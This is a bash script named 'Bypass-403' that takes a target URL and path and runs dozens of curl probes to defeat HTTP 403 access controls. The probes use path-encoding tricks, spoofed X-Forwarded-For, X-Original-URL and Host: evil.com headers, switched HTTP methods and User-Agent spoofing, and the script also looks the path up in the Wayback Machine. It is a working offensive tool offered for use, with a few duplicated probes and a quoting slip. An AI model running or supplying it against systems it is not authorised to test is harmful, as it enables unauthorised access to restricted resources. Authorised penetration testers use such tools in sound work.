#! /bin/bash
figlet Bypass-403
echo "                                               Made by iamj0ker modified by v0rl0x"
echo "./bypass-403.sh https://example.com path"
echo " "
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
echo "  --> ${1}/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
echo "  --> ${1}/%2e/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
echo "  --> ${1}/${2}/."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
echo "  --> ${1}//${2}//"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
echo "  --> ${1}/./${2}/./"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
echo "  --> ${1} -H X-rewrite-url: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
echo "  --> ${1}/${2}%20"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
echo "  --> ${1}/${2}%09"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
echo "  --> ${1}/${2}?"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
echo "  --> ${1}/${2}.html"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
echo "  --> ${1}/${2}/?anything"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
echo "  --> ${1}/${2}#"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
echo "  --> ${1}/${2}/*"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php
echo "  --> ${1}/${2}.php"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
echo "  --> ${1}/${2}.json"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2}  -X TRACE"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/"
echo "  --> ${1}/${2}..;/"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1/$2;/"
echo "  --> ${1}/${2};/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2} -X TRACE"
echo "Way back machine:"
curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X PUT $1/$2
echo "  --> ${1}/${2} -X PUT"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X DELETE $1/$2
echo "  --> ${1}/${2} -X DELETE"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X PATCH $1/$2
echo "  --> ${1}/${2} -X PATCH"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Referer: $1" $1/$2
echo "  --> ${1}/${2} -H Referer"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Origin: $1" $1/$2
echo "  --> ${1}/${2} -H Origin"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2%00"
echo "  --> ${1}/${2}%00"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2%2f"
echo "  --> ${1}/${2}%2f"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2%5c"
echo "  --> ${1}/${2}%5c"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..%2f"
echo "  --> ${1}/${2}..%2f"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2?fakeparam"
echo "  --> ${1}/${2}?fakeparam"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Host: evil.com" $1/$2
echo "  --> ${1}/${2} -H Host:evil.com"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -A "Googlebot" $1/$2
echo "  --> ${1}/${2} -A Googlebot"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" --http1.0 $1/$2
echo "  --> ${1}/${2} --http1.0"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" --http2 $1/$2
echo "  --> ${1}/${2} --http2"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Range: bytes=0-49" $1/$2
echo "  --> ${1}/${2} -H Range:bytes=0-49"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2."
echo "  --> ${1}/${2}."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1///$2"
echo "  --> ${1}///$2"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2@"
echo "  --> ${1}/${2}@"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/"
echo "  --> ${1}/${2}..;/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..%5C"
echo "  --> ${1}/${2}..%5C"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2.fake"
echo "  --> ${1}/${2}.fake"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2.json/"
echo "  --> ${1}/${2}.json/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Referer: $1" "$1/$2"
echo "  --> ${1}/${2} Referer Bypass"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Client-IP: 127.0.0.1" "$1/$2"
echo "  --> ${1}/${2} X-Client-IP Bypass"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Accept: */*" -H "Content-Type: application/x-www-form-urlencoded" "$1/$2"
echo "  --> ${1}/${2} Accept & Content-Type Bypass"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2.bak"
echo "  --> ${1}/${2}.bak"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Requested-With: XMLHttpRequest" "$1/$2"
echo "  --> ${1}/${2} X-Requested-With Bypass"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2?/"
echo "  --> ${1}/${2}?/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X HEAD "$1/$2"
echo "  --> ${1}/${2} -X HEAD"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X GET -d "test=data" "$1/$2"
echo "  --> ${1}/${2} Fat GET"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X GET "$1/$2"
echo "  --> ${1}/${2} -X GET Uppercase"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X get "$1/$2"
echo "  --> ${1}/${2} -X get Lowercase"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Originating-IP: 127.0.0.1" "$1/$2"
echo "  --> ${1}/${2} X-Originating-IP Bypass"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-IP: 127.0.0.1" "$1/$2"
echo "  --> ${1}/${2} X-Remote-IP Bypass"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-Addr: 127.0.0.1" "$1/$2"
echo "  --> ${1}/${2} X-Remote-Addr Bypass"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/%252f$2"
echo "  --> ${1}/%252f$2 Double URL Encoded /"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2%2500"
echo "  --> ${1}/${2}%2500 Double URL Encoded Null Byte"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -A "Mozilla/5.0" "$1/$2"
echo "  --> ${1}/${2} -A Mozilla User-Agent"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/test.json"
echo "  --> ${1}/${2}/test.json"
